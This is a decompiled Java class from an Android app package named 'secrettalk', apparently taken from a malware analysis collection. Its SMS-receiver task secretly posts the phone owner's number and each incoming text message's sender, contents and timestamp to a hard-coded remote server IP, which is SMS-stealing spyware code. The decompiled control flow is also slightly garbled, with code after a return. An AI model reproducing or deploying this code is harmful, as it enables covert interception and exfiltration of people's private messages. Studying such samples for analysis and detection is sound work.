package com.android.secrettalk;

import android.os.AsyncTask;
import com.google.gson.JsonObject;
import java.net.URI;
import java.net.URLEncoder;

class SmsReceiver$1
  extends AsyncTask<Void, Void, Void>
{
  SmsReceiver$1(SmsReceiver paramSmsReceiver, String paramString1, String paramString2) {}
  
  protected Void doInBackground(Void... paramVarArgs)
  {
    JsonObject localJsonObject1 = new JsonObject();
    localJsonObject1.addProperty("phone_number", GlobalData.my_phonenumber);
    String str = HttpManager.postHttpResponse(URI.create("http://61.33.28.196/secrettalk.server/api/api.php?mName=isBlockInformation&format=json"), localJsonObject1.toString());
    if (str.equals("0")) {
      SmsReceiver.is_blocked = false;
    }
    for (;;)
    {
      JsonObject localJsonObject2 = new JsonObject();
      localJsonObject2.addProperty("user_pn", GlobalData.my_phonenumber);
      localJsonObject2.addProperty("call_pn", this.val$strFrom);
      localJsonObject2.addProperty("contents", URLEncoder.encode(this.val$strMsg));
      localJsonObject2.addProperty("cdate", Long.valueOf(System.currentTimeMillis() / 1000L));
      localJsonObject2.addProperty("type", Integer.valueOf(0));
      HttpManager.postHttpResponse(URI.create("http://61.33.28.196/secrettalk.server/api/api.php?mName=smsInformation&format=json"), localJsonObject2.toString());
      return null;
      if (str.equals("1")) {
        SmsReceiver.is_blocked = true;
      }
    }
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.SmsReceiver.1
 * JD-Core Version:    0.7.0.1
 */